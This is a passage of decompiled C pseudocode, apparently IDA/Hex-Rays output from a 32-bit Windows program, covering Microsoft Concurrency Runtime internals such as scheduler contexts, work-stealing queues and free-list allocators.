  PSLIST_ENTRY v4; // eax
  signed __int32 v5; // edi
  int v6; // ecx
  _DWORD *v8; // [esp+10h] [ebp-4h]

  v8 = sub_475051();
  v4 = InterlockedPopEntrySList((PSLIST_HEADER)this + 7);
  if ( !v4 || (v5 = (signed __int32)&v4[-47], v4 == (PSLIST_ENTRY)188) )
    v5 = (*(int (__thiscall **)(volatile signed __int32 *, volatile signed __int32 **, int))(**this + 92))(
           *this,
           this,
           a2);
  else
    (*(void (__thiscall **)(signed __int32, volatile signed __int32 **, int))(*(_DWORD *)v5 + 24))(v5, this, a2);
  if ( a3 )
  {
    *(_BYTE *)(v5 + 172) = 1;
    *(_DWORD *)(v5 + 176) = v8 - 1;
    v8[40] = v5;
  }
  _InterlockedIncrement((volatile signed __int32 *)this + 9);
  sub_47C7FC((_DWORD *)*this + 12, *(_DWORD *)(v5 + 144));
  if ( *((_DWORD *)*this + 109) == *((_DWORD *)*this + 110) && *((int *)*this + 5) > 0 )
  {
    sub_47CFAB((int)(this + 14), v5);
    if ( sub_47764B(*this, 1) )
    {
      if ( v8 )
        v6 = sub_406D60(v8);
      else
        v6 = *((_DWORD *)this[1] + 2);
      (*(void (__thiscall **)(signed __int32, int, _DWORD))(*(_DWORD *)v5 + 28))(v5, v6, 0);
    }
  }
  else
  {
    sub_47CFAB((int)(this + 14), v5);
    sub_47C840(v5, 1, 0);
  }
  return v5;
}

//----- (0047D215) --------------------------------------------------------
char __thiscall sub_47D215(_DWORD *this)
{
  LPVOID v2; // eax
  int v3; // esi
  _DWORD *v4; // edi
  char v5; // bl

  v2 = sub_475051();
  v3 = (int)v2 + 156;
  if ( !v2 )
    v3 = 160;
  v4 = (_DWORD *)*this;
  if ( !sub_476193((_DWORD *)(*v4 + 60), (int)(v4 + 1)) )
    return 0;
  v5 = 1;
  if ( ((1 << (*(_DWORD *)(*(_DWORD *)v3 + 144) & 0x1F)) & *(_DWORD *)(v4[2]
                                                                     + 4 * (*(_DWORD *)(*(_DWORD *)v3 + 144) >> 5))) != 0 )
    return 0;
  return v5;
}

//----- (0047D269) --------------------------------------------------------
int __thiscall sub_47D269(_DWORD *this, int a2)
{
  int v2; // edi
  int v3; // esi
  _DWORD *v4; // eax
  int result; // eax
  _DWORD *i; // [esp+Ch] [ebp-4h]

  v2 = this[30];
  v3 = 0;
  if ( v2 <= 0 )
    return 0;
  v4 = this + 14;
  for ( i = this + 14; ; v4 = i )
  {
    result = sub_4743F9(v4, v3);
    if ( result )
    {
      if ( *(_DWORD *)(result + 88) == a2 )
        break;
    }
    if ( ++v3 >= v2 )
      return 0;
  }
  return result;
}

//----- (0047D2A6) --------------------------------------------------------
int __thiscall sub_47D2A6(_DWORD *this, _DWORD *a2)
{
  int result; // eax
  int v4; // esi

  if ( (*a2 & 0xFFFFFFF) != 3 )
    return 0;
  if ( a2[1] == *(_DWORD *)(*this + 372) )
    return a2[3];
  v4 = 0;
  if ( (int)this[30] <= 0 )
    return 0;
  while ( 1 )
  {
    result = sub_4743F9(this + 14, v4);
    if ( result )
    {
      if ( *(_DWORD *)(result + 140) == a2[2] )
        break;
    }
    if ( ++v4 >= this[30] )
      return 0;
  }
  return result;
}

//----- (0047D300) --------------------------------------------------------
char __thiscall sub_47D300(_DWORD *this, __int32 *a2, int a3, int a4, int a5, int a6, int a7)
{
  char v7; // bl
  __int32 v9; // eax
  int v10; // edi
  __int32 v11; // eax

  v7 = 1;
  if ( (a3 & 0xFFFFFFF) != 3 || (v9 = sub_47D2A6(this, &a3)) == 0 || !sub_47C42F(v9, a2, a7, 1) )
  {
    v10 = 0;
    if ( (int)this[30] <= 0 )
    {
      return 0;
    }
    else
    {
      while ( 1 )
      {
        v11 = sub_4743F9(this + 14, v10);
        if ( v11 )
        {
          if ( sub_47C42F(v11, a2, a7, 1) )
            break;
        }
        if ( ++v10 >= this[30] )
          return 0;
      }
    }
  }
  return v7;
}

//----- (0047D370) --------------------------------------------------------
int *__thiscall sub_47D370(int *this, int *a2)
{
  int v3; // eax

  v3 = (*(int (__thiscall **)(int))(*(_DWORD *)*this + 4))(*this);
  sub_481D45(a2, 2, this[12], v3, (int)this);
  return a2;
}

//----- (0047D3A4) --------------------------------------------------------
__int32 __thiscall sub_47D3A4(int *this, char a2)
{
  __int32 v3; // edi
  volatile __int32 *v5; // [esp+10h] [ebp-10h]

  v5 = (volatile __int32 *)this[5];
  sub_46FC7F(v5);
  v3 = sub_47D3E7(this, a2);
  sub_46FCC0(v5);
  return v3;
}

//----- (0047D3E7) --------------------------------------------------------
__int32 __thiscall sub_47D3E7(int *this, char a2)
{
  int v3; // edi
  int v4; // ecx
  __int32 v5; // ebx

  while ( 1 )
  {
    if ( *this >= this[1] )
      return 0;
    v3 = *this;
    v4 = *this & this[2];
    if ( (*(_BYTE *)(this[3] + 4 * v4) & 1) != 0 && !a2 && sub_47D215((_DWORD *)(this[4] + 8 * v4)) )
      return 0;
    v5 = _InterlockedExchange((volatile __int32 *)(this[3] + 4 * (this[2] & v3)), 0);
    if ( (v5 & 1) == 0 )
      break;
    v5 &= ~1u;
    if ( sub_477F29((int *)(this[4] + 8 * (this[2] & v3)), 0) )
      break;
    *this = v3 + 1;
  }
  if ( v5 )
    *this = v3 + 1;
  return v5;
}

//----- (0047D465) --------------------------------------------------------
_DWORD *__thiscall sub_47D465(_DWORD *this)
{
  *this = 0;
  this[1] = sub_46F9E3(0);
  return this;
}

//----- (0047D47A) --------------------------------------------------------
void __thiscall sub_47D47A(_DWORD *this)
{
  _DWORD *v2; // eax

  if ( *this )
  {
    do
    {
      v2 = (_DWORD *)sub_46F9E3(this[1]);
      this[1] = *v2;
      j_j_j___free_base(v2);
    }
    while ( (*this)-- != 1 );
  }
}

//----- (0047D4CC) --------------------------------------------------------
int *__thiscall sub_47D4CC(_DWORD *this)
{
  int *result; // eax
  int v3; // ecx

  result = (int *)sub_46F9E3(this[1]);
  if ( result )
  {
    v3 = *result;
    --*this;
    this[1] = v3;
  }
  return result;
}

//----- (0047D4E5) --------------------------------------------------------
int *__thiscall sub_47D4E5(_DWORD *this, int a2)
{
  int v3; // esi
  int v4; // eax
  int v5; // edi
  int *v6; // esi

  v3 = a2 + 4;
  v4 = sub_47D596(a2 + 4);
  v5 = v4;
  if ( v4 == -1 )
    goto LABEL_4;
  v6 = sub_47D4CC(&this[2 * v4 + 1]);
  if ( !v6 )
  {
    v3 = dword_4C10D8[v5];
LABEL_4:
    v6 = (int *)unknown_libname_28(v3);
  }
  *v6 = sub_46F9E3(v5);
  return v6 + 1;
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);
// 4C10D8: using guessed type int dword_4C10D8[98];

//----- (0047D535) --------------------------------------------------------
char __thiscall sub_47D535(int *this, _DWORD *a2)
{
  int v3; // eax

  if ( *this >= 32 )
    return 0;
  *a2 = this[1];
  v3 = sub_46F9E3((int)a2);
  ++*this;
  this[1] = v3;
  return 1;
}

//----- (0047D55F) --------------------------------------------------------
void __thiscall sub_47D55F(int *this, int a2)
{
  _DWORD *v2; // esi
  int v4; // eax

  v2 = (_DWORD *)(a2 - 4);
  v4 = sub_46F9E3(*(_DWORD *)(a2 - 4));
  if ( v4 == -1 || !sub_47D535(&this[2 * v4 + 1], v2) )
    j_j_j___free_base(v2);
}

//----- (0047D596) --------------------------------------------------------
int __cdecl sub_47D596(int a1)
{
  unsigned int v1; // edx
  int v3; // edx
  int v4; // ecx

  v1 = (a1 + 7) & 0xFFFFFFF8;
  if ( v1 > 0x1000 )
    return -1;
  v3 = v1 >> 3;
  if ( (unsigned int)v3 > 0x20 )
  {
    v4 = 5;
    if ( v3 >> 5 )
    {
      do
        ++v4;
      while ( v3 >> v4 > 0 );
    }
    v3 = 16 * (v4 - 5) + ((~((1 << (v4 - 5)) - 1) & ((1 << (v4 - 5)) - 1 + v3)) >> (v4 - 5));
  }
  return v3 - 1;
}

//----- (0047D5E7) --------------------------------------------------------
int *__cdecl sub_47D5E7(int a1)
{
  int v1; // esi
  int v2; // eax
  int v3; // edi
  int *v4; // esi

  v1 = a1 + 4;
  v2 = sub_47D596(a1 + 4);
  v3 = v2;
  if ( v2 != -1 )
    v1 = dword_4C10D8[v2];
  v4 = (int *)unknown_libname_28(v1);
  *v4 = sub_46F9E3(v3);
  return v4 + 1;
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);
// 4C10D8: using guessed type int dword_4C10D8[98];

//----- (0047D620) --------------------------------------------------------
_DWORD *__thiscall sub_47D620(_DWORD *this, int a2)
{
  _DWORD *result; // eax

  *this = &Concurrency::IExecutionContext::`vftable';
  sub_47791B(this + 1, a2, 0);
  *((_BYTE *)this + 179) &= 0xFCu;
  result = this;
  *this = &Concurrency::details::InternalContextBase::`vftable';
  this[1] = &Concurrency::details::InternalContextBase::`vftable';
  this[39] = 0;
  this[40] = 0;
  this[41] = 0;
  this[42] = 0;
  this[43] = 0;
  *((_BYTE *)this + 176) = 0;
  *((_BYTE *)this + 178) = 0;
  this[57] = 0;
  this[7] = 0;
  *((_BYTE *)this + 236) = 1;
  return result;
}
// 4C1264: using guessed type void *Concurrency::IExecutionContext::`vftable';
// 4C127C: using guessed type void *Concurrency::details::InternalContextBase::`vftable';
// 4C12A4: using guessed type void *Concurrency::details::InternalContextBase::`vftable';

//----- (0047D697) --------------------------------------------------------
char *__thiscall sub_47D697(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &Concurrency::context_self_unblock::`vftable';
  return this;
}
// 4C0B84: using guessed type void *Concurrency::context_self_unblock::`vftable';

//----- (0047D6B2) --------------------------------------------------------
char *__thiscall sub_47D6B2(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &Concurrency::context_unblock_unbalanced::`vftable';
  return this;
}
// 4C0B78: using guessed type void *Concurrency::context_unblock_unbalanced::`vftable';

//----- (0047D6CD) --------------------------------------------------------
char *__thiscall sub_47D6CD(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &Concurrency::invalid_oversubscribe_operation::`vftable';
  return this;
}
// 4C0BCC: using guessed type void *Concurrency::invalid_oversubscribe_operation::`vftable';

//----- (0047D6E8) --------------------------------------------------------
char *__thiscall sub_47D6E8(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &Concurrency::nested_scheduler_missing_detach::`vftable';
  return this;
}
// 4C0BC0: using guessed type void *Concurrency::nested_scheduler_missing_detach::`vftable';

//----- (0047D703) --------------------------------------------------------
void __thiscall sub_47D703(_DWORD *this)
{
  void *v1; // esi

  v1 = this + 1;
  *this = &Concurrency::details::InternalContextBase::`vftable';
  this[1] = &Concurrency::details::InternalContextBase::`vftable';
  sub_47DB32(this);
  sub_477A5E(v1);
}
// 4C127C: using guessed type void *Concurrency::details::InternalContextBase::`vftable';
// 4C12A4: using guessed type void *Concurrency::details::InternalContextBase::`vftable';

//----- (0047D74F) --------------------------------------------------------
int sub_47D74F()
{
  return UserMathErrorFunction();
}

//----- (0047D785) --------------------------------------------------------
char *__thiscall sub_47D785(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 1);
  sub_47D703(this - 1);
  if ( (a2 & 1) != 0 )
    sub_46C87D(v2);
  return v2;
}

//----- (0047D7B2) --------------------------------------------------------
int __thiscall sub_47D7B2(_DWORD *this, int a2, int a3, int a4, int a5)
{
  _DWORD *v6; // eax
  int v7; // edx
  int v8; // edi
  int v9; // edi
  int (__thiscall *v10)(int, _DWORD *, int, int, int, int); // esi
  int result; // eax
  int v12; // edx
  int v13; // esi
  unsigned int *v14; // esi
  int v15; // esi
  _DWORD *v16; // esi
  int v17; // [esp-14h] [ebp-38h] BYREF
  int v18; // [esp-10h] [ebp-34h] BYREF
  int v19; // [esp-Ch] [ebp-30h]
  int v20; // [esp-8h] [ebp-2Ch]
  int v21; // [esp-4h] [ebp-28h]
  int v22[5]; // [esp+Ch] [ebp-18h] BYREF
  _DWORD *v23; // [esp+20h] [ebp-4h]

  v6 = sub_475051();
  v7 = this[8];
  v8 = (int)v6;
  v23 = v6;
  if ( *(int *)(v7 + 440) > 0 )
  {
    v9 = this[8];
    v10 = *(int (__thiscall **)(int, _DWORD *, int, int, int, int))(*(_DWORD *)v9 + 60);
    sub_4777A9(&v18, &a2);
    result = v10(v9, this, v18, v19, v20, v21);
    if ( (_BYTE)result )
      return result;
    v8 = (int)v23;
  }
  if ( !v8 || *(_BYTE *)(v8 + 76) || this[8] != sub_406D70((_DWORD *)v8) )
    goto LABEL_18;
  UserMathErrorFunction();
  v12 = this[7];
  if ( (*(_BYTE *)(*(_DWORD *)(v12 + 256) + 48) & 2) != 0
    || ((1 << (*(_BYTE *)(*(_DWORD *)(v8 + 156) + 144) & 0x1F)) & *(_DWORD *)(*(_DWORD *)(v12 + 32)
                                                                            + 4
                                                                            * (*(_DWORD *)(*(_DWORD *)(v8 + 156) + 144) >> 5))) == 0
    || *(_DWORD *)(*(_DWORD *)(v8 + 156) + 20) - *(_DWORD *)(*(_DWORD *)(v8 + 156) + 16) >= *(unsigned __int16 *)(this[8] + 16) )
  {
    UserMathErrorFunction();
LABEL_18:
    v16 = (_DWORD *)this[7];
    sub_4777A9(&v18, &a2);
    return sub_47F548(v16, (int)this, v18, v19, v20, v21);
  }
  v23 = (_DWORD *)this[7];
  v13 = v23[64];
  if ( sub_4782B7((_DWORD *)v8) != v13 )
    this[57] = 1;
  sub_47E34C((int *)(*(_DWORD *)(v8 + 156) + 16), (int)this);
  if ( *(int *)(this[8] + 436) > 0 )
  {
    v14 = (unsigned int *)this[8];
    sub_4777A9(v22, &a2);
    v21 = 11;
    sub_4777A9(&v17, v22);
    sub_477052(v14, (int)v23, v17, v18, v19, v20, v21);
  }
  v15 = v23[64];
  if ( sub_4782B7((_DWORD *)v8) != v15 )
    this[57] = 0;
  return UserMathErrorFunction();
}
// 47D7B2: using guessed type int var_18[5];

//----- (0047D930) --------------------------------------------------------
int *__thiscall sub_47D930(_DWORD **this, int a2)
{
  PSLIST_ENTRY v3; // eax
  int *v4; // esi

  UserMathErrorFunction();
  v3 = sub_47C60A(this[39]);
  v4 = sub_47D4E5(v3, a2);
  UserMathErrorFunction();
  return v4;
}

//----- (0047D984) --------------------------------------------------------
int __thiscall sub_47D984(int this)
{
  int v2; // edi
  int v3; // eax
  int v4; // esi
  char v5; // al
  signed __int32 v6; // ecx
  struct _SINGLE_LIST_ENTRY *v7; // edi
  struct _SINGLE_LIST_ENTRY *Next; // esi
  struct _SINGLE_LIST_ENTRY *v9; // esi
  int v10; // eax
  int v12[3]; // [esp-10h] [ebp-24h] BYREF
  int v13; // [esp-4h] [ebp-18h]
  struct _SINGLE_LIST_ENTRY *v14; // [esp+Ch] [ebp-8h]
  bool v15; // [esp+12h] [ebp-2h] BYREF
  bool v16; // [esp+13h] [ebp-1h] BYREF

  UserMathErrorFunction();
  v2 = *(_DWORD *)(this + 28);
  v13 = *(_DWORD *)(this + 8);
  v3 = (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 4))(v2);
  sub_47890F(3, 4u, v3, v13);
  v4 = 1;
  v5 = *(_BYTE *)(*(_DWORD *)(this + 156) + 173);
  v6 = _InterlockedIncrement((volatile signed __int32 *)(this + 44));
  if ( v5 )
  {
    if ( v6 != 1 || _InterlockedCompareExchange((volatile signed __int32 *)(this + 44), 2, 1) != 1 )
      v4 = 2;
    sub_47E5F1(this - 4, v4);
  }
  else if ( v6 == 1 )
  {
    v16 = 0;
    v15 = 0;
    v7 = (struct _SINGLE_LIST_ENTRY *)sub_47DD9E((_DWORD *)(this - 4), &v16, &v15);
    if ( _InterlockedCompareExchange((volatile signed __int32 *)(this + 44), 2, 1) == 1 )
    {
      if ( v16 )
        sub_47E2E2((int)v7, *(_DWORD *)(this + 24), 0, 0);
      sub_47E710((struct _SINGLE_LIST_ENTRY *)(this - 4), (int)v7, 1);
    }
    else if ( v7 )
    {
      if ( v16 )
      {
        sub_476924(*(_DWORD *)(this + 28), v7, 1);
      }
      else
      {
        v14 = v7 + 1;
        if ( v15 )
        {
          Next = v7[42].Next;
          UserMathErrorFunction();
          sub_4811BC(Next, (int)&v7[1]);
          UserMathErrorFunction();
        }
        else
        {
          v14 = v7 + 1;
        }
        v9 = v7->Next[5].Next;
        v10 = sub_406D60(v14);
        sub_4777A9(v12, (_DWORD *)(v10 + 12));
        ((void (__thiscall *)(struct _SINGLE_LIST_ENTRY *, int, int, int, int))v9)(v7, v12[0], v12[1], v12[2], v13);
      }
    }
  }
  return UserMathErrorFunction();
}

//----- (0047DAC0) --------------------------------------------------------
char __thiscall sub_47DAC0(int this)
{
  __int32 v2; // ecx
  LPVOID v3; // eax
  LPVOID v4; // esi
  __int32 v6[2]; // [esp+8h] [ebp-8h] BYREF

  if ( *(_DWORD *)(this + 160) )
  {
    *(_BYTE *)(this + 176) = 1;
    v2 = *(_DWORD *)(this + 160);
    v6[0] = 0;
    LOBYTE(v3) = sub_47C42F(v2, v6, 15, 1);
    if ( (_BYTE)v3 )
      LOBYTE(v3) = sub_47C54E((_DWORD **)v6[1], v6[0], 0, 0);
  }
  else
  {
    v4 = (LPVOID)(this + 4);
    v3 = sub_475051();
    if ( v3 == v4 )
    {
      *(_BYTE *)(this + 176) = 1;
    }
    else
    {
      sub_47E493((_DWORD *)this);
      sub_47DB32((_DWORD *)this);
      LOBYTE(v3) = sub_474EE3(*(_DWORD *)(this + 32));
    }
  }
  return (char)v3;
}

//----- (0047DB32) --------------------------------------------------------
void __thiscall sub_47DB32(_DWORD *this)
{
  sub_477F70((int)(this + 1));
  sub_47E5A6(this, 0, 0);
}

//----- (0047DB4A) --------------------------------------------------------
int __thiscall sub_47DB4A(_DWORD *this)
{
  UserMathErrorFunction();
  sub_47DB32(this);
  return sub_474EE3(this[8]);
}

//----- (0047DB65) --------------------------------------------------------
BOOL __thiscall sub_47DB65(int this, int a2)
{
  _DWORD *v3; // eax
  int v4; // eax
  char v5; // al
  char pExceptionObject[12]; // [esp+10h] [ebp-30h] BYREF
  int v8[2]; // [esp+1Ch] [ebp-24h] BYREF
  int v9; // [esp+24h] [ebp-1Ch]
  void *v10; // [esp+28h] [ebp-18h] BYREF
  int v11; // [esp+2Ch] [ebp-14h]
  char v12; // [esp+32h] [ebp-Eh]
  char v13; // [esp+33h] [ebp-Dh]
  int v14; // [esp+3Ch] [ebp-4h]

  v11 = 0;
  *(_DWORD *)(this + 72) = GetCurrentThreadId();
  sub_478744((void *)(this + 4));
  v3 = (_DWORD *)(*(int (__thiscall **)(_DWORD, void **))(**(_DWORD **)(this + 32) + 12))(*(_DWORD *)(this + 32), &v10);
  v14 = 0;
  v11 = 1;
  if ( sub_479B05(v3, 9u) || (v4 = sub_471D09(), v12 = 1, v4 != 6) )
    v12 = 0;
  v14 = -1;
  sub_479ADB(&v10);
  if ( v12 )
    sub_47B8BB(1);
  UserMathErrorFunction();
  *(_DWORD *)(this + 172) = 0;
  v13 = 0;
  if ( !sub_47DD30(this) )
    goto LABEL_9;
LABEL_7:
  v5 = sub_47E0F9(this);
LABEL_8:
  v13 = v5;
  while ( !v5 )
  {
LABEL_9:
    *(_BYTE *)(this + 179) &= ~2u;
    v8[0] = 0;
    v9 = 0;
    if ( !*(_DWORD *)(this + 160) )
    {
      UserMathErrorFunction();
      std::bad_function_call::bad_function_call((std::bad_function_call *)pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVnested_scheduler_missing_detach_Concurrency__);
    }
    if ( !*(_BYTE *)(this + 178) && sub_47CBF1(*(_DWORD *)(this + 160)) )
    {
      UserMathErrorFunction();
      sub_474CC8(*(_DWORD **)(this + 32));
      UserMathErrorFunction();
    }
    if ( sub_47EA14(this, (int)v8) )
    {
      if ( v8[0] != 1 )
      {
        sub_47DCF3((int *)this, v8);
        goto LABEL_7;
      }
      sub_47E710((struct _SINGLE_LIST_ENTRY *)this, v9, 0);
      break;
    }
    if ( sub_47E0F9(this) )
      break;
    sub_47E914((_DWORD *)this);
    if ( *(_BYTE *)(this + 176) )
    {
      sub_47DB4A((_DWORD *)this);
      v5 = 1;
      goto LABEL_8;
    }
    v5 = v13;
  }
  if ( v12 )
    sub_47B8DD();
  return sub_477FE0();
}
// 471D09: using guessed type int sub_471D09(void);
// 4778A6: using guessed type _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this);

//----- (0047DCF3) --------------------------------------------------------
char __thiscall sub_47DCF3(int *this, _DWORD *a2)
{
  sub_483358(a2, this);
  ++*(_DWORD *)(this[40] + 108);
  UserMathErrorFunction();
  sub_482326(a2);
  UserMathErrorFunction();
  return sub_478536(this + 1);
}

//----- (0047DD30) --------------------------------------------------------
char __thiscall sub_47DD30(int this)
{
  int v2; // esi
  int v3; // ecx

  if ( !*(_DWORD *)(this + 168) )
    return 0;
  UserMathErrorFunction();
  v2 = *(_DWORD *)(this + 168);
  if ( *(_BYTE *)(this + 177) )
  {
    (*(void (__thiscall **)(_DWORD, _DWORD))(v2 + 12))(*(_DWORD *)(v2 + 12), *(_DWORD *)(this + 168));
    *(_DWORD *)(this + 168) = 0;
  }
  else
  {
    sub_4833A3(*(_DWORD *)(this + 168));
    v3 = *(_DWORD *)(this + 32);
    *(_DWORD *)(this + 168) = 0;
    sub_47696E(v3, v2);
  }
  UserMathErrorFunction();
  sub_478536((int *)(this + 4));
  return 1;
}

//----- (0047DD9E) --------------------------------------------------------
int __thiscall sub_47DD9E(_DWORD *this, bool *a2, bool *a3)
{
  int v4; // esi
  struct _SINGLE_LIST_ENTRY *v5; // ebx
  int v7; // [esp-Ch] [ebp-28h]
  int v8[2]; // [esp+Ch] [ebp-10h] BYREF
  int v9; // [esp+14h] [ebp-8h]
  _DWORD *v10; // [esp+18h] [ebp-4h]

  v10 = this;
  v4 = this[40];
  v7 = this[7];
  v8[0] = 0;
  v9 = 0;
  if ( !(*(unsigned __int8 (__thiscall **)(int, int *, int, _DWORD, int))(v4 + 72))(v4 + 40, v8, v7, 0, 25) )
  {
    v5 = (struct _SINGLE_LIST_ENTRY *)sub_47569E(this[8], 1);
    *a2 = v5 != 0;
    return (int)v5;
  }
  if ( v8[0] == 1 )
    return v9;
  UserMathErrorFunction();
  v5 = (struct _SINGLE_LIST_ENTRY *)sub_47569E(this[8], 1);
  UserMathErrorFunction();
  if ( !v5 )
  {
    if ( !(*(unsigned __int8 (__thiscall **)(int, int *, _DWORD, _DWORD, int))(v10[40] + 72))(
            v10[40] + 40,
            v8,
            v10[7],
            0,
            1) )
      return (int)v5;
    return sub_481EA2(v8);
  }
  if ( !sub_482513(v8) )
  {
    if ( !(*(unsigned __int8 (__thiscall **)(int, int *, _DWORD, _DWORD, int))(v10[40] + 72))(
            v10[40] + 40,
            v8,
            v10[7],
            0,
            7) )
    {
      *a2 = 1;
      return (int)v5;
    }
    if ( v8[0] == 1 )
    {
      sub_476924(v10[8], v5, 1);
      return sub_481EA2(v8);
    }
  }
  *a3 = v8[0] == 4;
  sub_481EEF(v8, (int)v5);
  return (int)v5;
}

//----- (0047DEC8) --------------------------------------------------------
int __thiscall sub_47DEC8(_DWORD **this, int a2)
{
  int *v3; // eax

  UserMathErrorFunction();
  v3 = (int *)sub_47C60A(this[39]);
  sub_47D55F(v3, a2);
  return UserMathErrorFunction();
}

//----- (0047DEF4) --------------------------------------------------------
signed __int32 __thiscall sub_47DEF4(volatile signed __int32 *this, signed __int32 a2)
{
  int v2; // esi

  v2 = 0;
  if ( a2 && a2 == *((_DWORD *)this + 41) && _InterlockedCompareExchange(this + 41, 0, a2) == a2 )
    return a2;
  return v2;
}

//----- (0047DF22) --------------------------------------------------------
int __thiscall sub_47DF22(_DWORD *this)
{
  return sub_4190D0(this - 1);
}

//----- (0047DF2A) --------------------------------------------------------
int __thiscall sub_47DF2A(_DWORD *this)
{
  return this[39];
}

//----- (0047DF31) --------------------------------------------------------
int __thiscall sub_47DF31(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[8] + 52))(this[8]);
}

//----- (0047DF4A) --------------------------------------------------------
int __thiscall sub_47DF4A(_DWORD *this)
{
  int v2; // edi

  UserMathErrorFunction();
  if ( this[39] )
    v2 = *(_DWORD *)(this[39] + 136);
  else
    v2 = -1;
  UserMathErrorFunction();
  return v2;
}

//----- (0047DF79) --------------------------------------------------------
void __thiscall sub_47DF79(int *this, int a2, int a3, int a4)
{
  int *v4; // edi
  _DWORD *v5; // eax
  volatile __int32 *v6; // esi
  int v7; // edx
  int v8; // eax
  int v9; // ebx
  int v10; // ecx
  int v11; // edx
  unsigned int v12; // edx
  int v13; // ecx
  int v14; // edx
  int v15; // ecx
  void *v16; // [esp+10h] [ebp-30h]
  void *Block; // [esp+14h] [ebp-2Ch]
  unsigned int v19; // [esp+20h] [ebp-20h]
  _DWORD *v20; // [esp+24h] [ebp-1Ch]
  int v21; // [esp+28h] [ebp-18h]
  int v22; // [esp+2Ch] [ebp-14h]
  int v23; // [esp+30h] [ebp-10h]

  v4 = this;
  v19 = 2 * this[2] + 2;
  v21 = unknown_libname_28((unsigned __int64)v19 >> 30 != 0 ? -1 : 4 * v19);
  Block = (void *)v4[3];
  v5 = (_DWORD *)unknown_libname_28((unsigned __int64)v19 >> 29 != 0 ? -1 : 8 * v19);
  v20 = v5;
  if ( v5 )
    `vector constructor iterator'(v5, 8u, v19, (void *(__thiscall *)(void *))unknown_libname_33);
  else
    v20 = 0;
  v6 = (volatile __int32 *)v4[5];
  v16 = (void *)v4[4];
  sub_46FC7F(v6);
  v7 = 0;
  v8 = *v4;
  v9 = v4[1] - *v4;
  v22 = *v4;
  v23 = 0;
  if ( v9 > 0 )
  {
    do
    {
      *(_DWORD *)(v21 + 4 * v7) = *(_DWORD *)(v4[3] + 4 * (v4[2] & v8));
      v10 = v4[4];
      v11 = v4[2] & v22;
      v20[2 * v23] = *(_DWORD *)(v10 + 8 * v11);
      v4 = this;
      v20[2 * v23 + 1] = *(_DWORD *)(v10 + 8 * v11 + 4);
      v7 = v23 + 1;
      v8 = v22 + 1;
      v23 = v7;
      ++v22;
    }
    while ( v7 < v9 );
  }
  memset((void *)(v21 + 4 * v9), 0, 4 * (v19 - v9));
  v4[3] = v21;
  v12 = v19 - 1;
  v4[4] = (int)v20;
  *v4 = 0;
  v4[2] = v19 - 1;
  if ( a3 )
  {
    v13 = v4[4];
    v14 = v9 & v12;
    *(_DWORD *)(v13 + 8 * v14) = a3;
    *(_DWORD *)(v13 + 8 * v14 + 4) = a4;
    v12 = v4[2];
    v15 = a2 | 1;
  }
  else
  {
    v15 = a2;
  }
  *(_DWORD *)(v4[3] + 4 * (v9 & v12)) = v15;
  v4[1] = v9 + 1;
  sub_46FCC0(v6);
  j_j_j___free_base(Block);
  j_j_j___free_base(v16);
}
// 468E98: using guessed type void __stdcall `vector constructor iterator'(void *, unsigned int, unsigned int, void *(__thiscall *)(void *));
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);
// 47C272: using guessed type int unknown_libname_33();

//----- (0047E0F1) --------------------------------------------------------
bool __thiscall sub_47E0F1(_DWORD *this)
{
  return this[11] == 2;
}

//----- (0047E0F9) --------------------------------------------------------
char __thiscall sub_47E0F9(int this)
{
  if ( *(_BYTE *)(this + 178) || !*(_BYTE *)(*(_DWORD *)(this + 160) + 173) )
    return 0;
  if ( *(_DWORD *)(this + 172) )
    sub_47C7BC((_DWORD *)(*(_DWORD *)(this + 32) + 60), *(_DWORD *)(*(_DWORD *)(this + 160) + 144));
  *(_DWORD *)(this + 172) = 0;
  if ( sub_47E5F1(this, 0) )
    sub_47DB4A((_DWORD *)this);
  return 1;
}

//----- (0047E157) --------------------------------------------------------
int __thiscall sub_47E157(int this)
{
  int v2; // eax
  int v3; // esi
  int v4; // ecx
  int v6; // [esp+Ch] [ebp-18h]
  int v7; // [esp+10h] [ebp-14h]
  int v8; // [esp+14h] [ebp-10h]
  int v9; // [esp+18h] [ebp-Ch]
  int v10; // [esp+1Ch] [ebp-8h]
  bool v11; // [esp+22h] [ebp-2h] BYREF
  bool v12; // [esp+23h] [ebp-1h] BYREF

  UserMathErrorFunction();
  v12 = 0;
  v11 = 0;
  v2 = sub_47DD9E((_DWORD *)this, &v12, &v11);
  v3 = v2;
  v7 = v2;
  if ( v12 )
    sub_47E2E2(v2, *(_DWORD *)(this + 28), 0, 0);
  UserMathErrorFunction();
  v4 = *(_DWORD *)(this + 160);
  v6 = *(_DWORD *)(this + 32);
  *(_DWORD *)(this + 160) = 0;
  v10 = v4;
  v8 = *(_DWORD *)(this + 156);
  v9 = v3;
  if ( !v3 )
    v9 = (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 4))(v4);
  (*(void (__fastcall **)(int, __int32, int))(*(_DWORD *)v10 + 16))(
    v10,
    _InterlockedExchange((volatile __int32 *)(this + 44), 1),
    v7);
  if ( v9 )
  {
    (*(void (__thiscall **)(int, int, int))(*(_DWORD *)v8 + 4))(v8, v9, 2);
  }
  else
  {
    sub_47C840(v10, 4, 1);
    sub_474EFC(v6);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v8 + 8))(v8, 2);
  }
  UserMathErrorFunction();
  return UserMathErrorFunction();
}

//----- (0047E25C) --------------------------------------------------------
char __thiscall sub_47E25C(int this, char a2)
{
  int v3; // eax
  _BYTE *v4; // eax
  char pExceptionObject[12]; // [esp+4h] [ebp-Ch] BYREF

  v3 = *(_DWORD *)(this + 20);
  if ( a2 )
  {
    v4 = (_BYTE *)(v3 + 1);
    *(_DWORD *)(this + 20) = v4;
    if ( v4 == (_BYTE *)1 )
    {
      UserMathErrorFunction();
